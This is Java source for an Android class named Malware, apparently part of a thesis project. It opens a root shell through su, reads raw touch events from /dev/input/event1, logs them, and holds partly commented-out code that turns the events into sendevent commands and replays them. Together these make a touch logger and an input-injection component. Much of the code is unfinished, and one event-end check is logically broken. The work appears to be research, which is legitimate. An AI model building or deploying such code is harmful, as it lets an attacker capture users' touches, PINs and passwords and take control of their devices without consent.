package com.example.thesis;

import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import java.util.Queue;

/**
 * This is the malware part of the app.
 */
public class Malware implements Runnable{
    private Queue<String[]> commands = new LinkedList<>();
    private Process getEventProcess;
    private boolean running = false;


    @Override
    public void run() {
        Log.i("Malware", "Starting malware!");
        running = true;
        captureKeyPresses();
    }

    public void stop() {
        // TODO: check what happens if it is already destroyed.
        Log.i("Malware", "Stopping malware!");
        getEventProcess.destroy();
    }


    /**
     * Captures touch events and saves them as commands into the commands queue.
     * Helpful:
     * https://stackoverflow.com/questions/5711084/java-runtime-getruntime-getting-output-from-executing-a-command-line-program
     * https://stackoverflow.com/questions/18570962/permission-denied-on-rooted-android-phone-with-getevent
     */
    private void captureKeyPresses() {
        try {
            // ...
            ProcessBuilder pb = new ProcessBuilder();
            pb.command("/system/bin/su");
            getEventProcess = pb.start();
            OutputStream outputStream = getEventProcess.getOutputStream();

            // outputStream.write(("cd /mnt/sdcard \n").getBytes());
            outputStream.write(("od /dev/input/event1 \n").getBytes());
            // outputStream.write(("cat events \n").getBytes());
            outputStream.flush();

            BufferedReader bufferedReaderInput = new BufferedReader(new InputStreamReader(getEventProcess.getInputStream()), 1);
            BufferedReader bufferedReaderErrors = new BufferedReader(new InputStreamReader(getEventProcess.getErrorStream()), 1);  // TODO: make it read errors aswell

            List<String> touchEvent = new ArrayList<>();

            // Continuously reading incoming events.
            String line;
            while ((line = bufferedReaderInput.readLine()) != null) {
                Log.i("Malware Captured Event", line);  // TODO: for testing, remove later.
                /*
                String command = eventToCommand(line);
                touchEvent.add(command);

                String[] commandSplit = command.split(" ");
                if (commandSplit[2].equals("0") && commandSplit[3].equals("0") && commandSplit[3].equals("4")) {
                    // This means that this is the end of the current event.
                    String[] touchEventArray = new String[touchEvent.size()];
                    touchEventArray = touchEvent.toArray(touchEventArray);
                    this.commands.add(touchEventArray);
                    touchEvent.clear();
                    Log.i("Malware", "Captured touch event!");
                    forTesting();  //TODO: remove later!
                }
                */
            }
            bufferedReaderInput.close();
            bufferedReaderErrors.close();
            getEventProcess.destroy();
        } catch (Exception error) {
            Log.e("Malware getevent", error.getMessage());
        }
    }


    /**
     * Takes a od line and checks if it is a ABS_X
     * @param line - for example "[   14633.633697] /dev/input/event1: 0003 0036 000046b5".
     * @return string of the command - "sendevent /dev/input/event1 3 54 18101".
     */
    public String getCoordinates(String line) {
        // TODO: https://stackoverflow.com/questions/28215812/adb-shell-getevent-method-returns-twice-the-value-for-x-and-y-on-nexus-4/28217144#28217144
        // TODO: Find resoultion by getevent -il /dev/input/event1 | grep ABS_MT_POSITION
        // TODO: Find device resoultion
        // ABS_MT_POSITION_X == 000065
        // ABS_MT_POSITION_Y == 000066
        // ABS_MT_TRACKING_ID == 000071 <- indicating dragging.

        String[] event = line.split("]");
        event = event[1].split("\\s+");

        // Building the new command.
        StringBuilder sb = new StringBuilder();
        sb.append("sendevent").append(" ");
        sb.append(event[1].substring(0, event[1].length() - 1)).append(" ");
        sb.append(Integer.parseInt(event[5], 8)).append(" ");
        sb.append(Integer.parseInt(event[6], 8)).append(" ");
        sb.append(Integer.parseInt(event[7], 8));

        // Returning it.
        return sb.toString();
    }


    /**
     * Turns off getEventProcess and resends all captured events.
     */
    private void sendKeyPresses() {
        // If I would leave it running it would recapture these events.
        getEventProcess.destroy();

        // Sending collected events.
        while(!commands.isEmpty()) {
            String[] touchEvent = commands.poll();
            try {
                Runtime.getRuntime().exec(touchEvent);
            } catch (IOException error) {
                Log.e("Malware sendevent", error.getMessage());
            }
        }
    }


    private void getTouchCoordinates() {

    }


    private void forTesting() {
        // TODO: remove later, is for testing basic functionality.
        if (commands.size() >= 4) {
            sendKeyPresses();
        }
    }
}
